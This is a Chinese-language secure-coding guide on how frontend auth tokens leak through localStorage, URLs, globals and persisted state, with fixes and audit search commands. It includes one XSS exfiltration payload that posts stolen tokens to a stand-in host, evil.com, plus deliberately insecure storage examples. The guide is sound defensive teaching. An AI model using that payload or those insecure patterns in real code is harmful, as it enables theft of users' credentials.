# 客户端 Token 存储与泄露（Client Token Storage Leakage）

## 漏洞模式

前端将认证 token（JWT / API key / session token）存储在不安全的位置，或通过不安全的方式传递，导致 token 被窃取。

**核心原则：认证 token 应存储在 `HttpOnly` Cookie 中（JS 不可读），而非 `localStorage` / `sessionStorage` / 全局变量 / URL 参数中。任何 XSS 漏洞都能读取 `localStorage`，但无法读取 `HttpOnly` Cookie。**

## 风险矩阵

| 存储位置 | XSS 可读 | 页面关闭后持久 | 跨标签共享 | CSRF 风险 | 推荐 |
|---------|---------|-------------|---------|----------|------|
| `HttpOnly` Cookie | 否 | 是 | 是 | 需 SameSite | **推荐** |
| `localStorage` | **是** | 是 | 是 | 否 | **不推荐** |
| `sessionStorage` | **是** | 否 | 否 | 否 | **不推荐** |
| JS 全局变量 | **是** | 否 | 否 | 否 | **不推荐** |
| URL 参数 | **是** | Referer 泄露 | — | — | **禁止** |

## 通用代码示例

### 存储在 localStorage（XSS 可窃取）

```javascript
// ❌ 登录后将 token 存入 localStorage
async function login(username, password) {
    const res = await fetch('/api/login', {
        method: 'POST',
        body: JSON.stringify({ username, password }),
    });
    const data = await res.json();
    localStorage.setItem('token', data.token);       // XSS 可读取
    localStorage.setItem('refreshToken', data.refreshToken); // 更危险：refresh token 长期有效
}

// ❌ 请求时从 localStorage 取出
async function fetchAPI(url) {
    const token = localStorage.getItem('token');
    return fetch(url, {
        headers: { 'Authorization': 'Bearer ' + token },
    });
}
```

攻击者利用 XSS 窃取 token：

```javascript
// 攻击者 payload（只需一次 XSS）
fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        token: localStorage.getItem('token'),
        refreshToken: localStorage.getItem('refreshToken'),
    }),
});
```

```javascript
// ✅ 使用 HttpOnly Cookie（服务端设置）
// 前端不需要手动管理 token，浏览器自动附带 cookie
async function fetchAPI(url) {
    return fetch(url, {
        credentials: 'same-origin', // 自动附带同源 cookie
    });
}

// 服务端登录响应设置 HttpOnly cookie
// Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Lax; Path=/
```

### Token 在 URL 中传递（Referer 泄露）

```javascript
// ❌ token 放在 URL query 参数中
window.location.href = '/dashboard?token=' + authToken;

// ❌ 链接中包含 token
const shareUrl = `https://app.com/shared?access_token=${token}`;
```

泄露路径：
- 浏览器 Referer 头：用户点击页面上的外部链接时，`Referer: https://app.com/dashboard?token=xxx` 被发送到外部站点
- 浏览器历史记录
- 代理服务器日志
- 服务端访问日志

```javascript
// ✅ 通过 Authorization header 传递 token（不走 URL）
fetch('/api/resource', {
    headers: { 'Authorization': 'Bearer ' + token },
});

// ✅ 如果必须在 URL 中传递（如 WebSocket），使用一次性 token
const wsUrl = `wss://app.com/ws?ticket=${oneTimeTicket}`;
```

### 敏感数据在全局变量 / window 对象

```javascript
// ❌ 将 token 挂在全局对象上
window.__APP_STATE__ = {
    user: { id: 1, name: 'admin' },
    token: 'eyJhbGciOiJIUzI1NiI...',
    apiKey: 'sk-live-xxx',
};

// ❌ 服务端渲染时将 token 写入 HTML
// <script>var TOKEN = "eyJhbGciOiJIUzI1NiI...";</script>
```

```javascript
// ✅ 不在客户端暴露长期凭据
// 使用 HttpOnly cookie 管理认证
// API key 只在服务端使用，不发送到前端
```

### Vue / React 状态管理中存储 token

```javascript
// ❌ Pinia / Vuex store 中存储 token 并持久化到 localStorage
// store/auth.js
export const useAuthStore = defineStore('auth', {
    state: () => ({
        token: localStorage.getItem('token') || '',
    }),
    actions: {
        setToken(token) {
            this.token = token;
            localStorage.setItem('token', token); // 持久化到 localStorage
        },
    },
});
```

```javascript
// ✅ 如果必须在前端管理 token（SPA 限制），使用内存变量而非持久存储
let accessToken = null; // 仅内存，页面刷新后需重新获取

export const useAuthStore = defineStore('auth', {
    state: () => ({
        isAuthenticated: false,
    }),
    actions: {
        setToken(token) {
            accessToken = token; // 不持久化
            this.isAuthenticated = true;
        },
        getToken() {
            return accessToken;
        },
    },
});
```

## 识别信号

| 信号 | 说明 |
|------|------|
| `localStorage.setItem('token'` / `sessionStorage.setItem('token'` | Token 存储在 Web Storage |
| `Authorization: Bearer` + 从 Storage 读取 | 前端手动管理 token |
| URL 含 `token=` / `access_token=` / `api_key=` | Token 在 URL 中传递 |
| `window.__` / 全局变量含 token / apiKey / secret | 敏感数据暴露在全局作用域 |
| SSR 模板中 `<script>var TOKEN=` | 服务端渲染将 token 写入 HTML |
| `localStorage.getItem('refreshToken')` | Refresh token 存在客户端 = 长期凭据泄露 |

## 审计方法

1. **搜索 Storage 操作**：`rg "localStorage\.(set|get)Item|sessionStorage\.(set|get)Item"` 查找所有 Web Storage 读写
2. **搜索 token 相关变量**：`rg "token|apiKey|api_key|secret|credential|auth"` 在 JS/TS 文件中，检查这些变量的来源和存储位置
3. **搜索 URL 中的 token**：`rg "token=|access_token=|api_key=|key="` 在路由和链接构建代码中
4. **搜索全局变量**：`rg "window\.|global\."` 检查是否有敏感数据挂载在全局对象
5. **检查认证机制**：确认项目使用 Cookie 还是 Bearer Token 认证；如果是 Bearer Token，检查 token 的完整生命周期（获取→存储→使用→刷新→销毁）
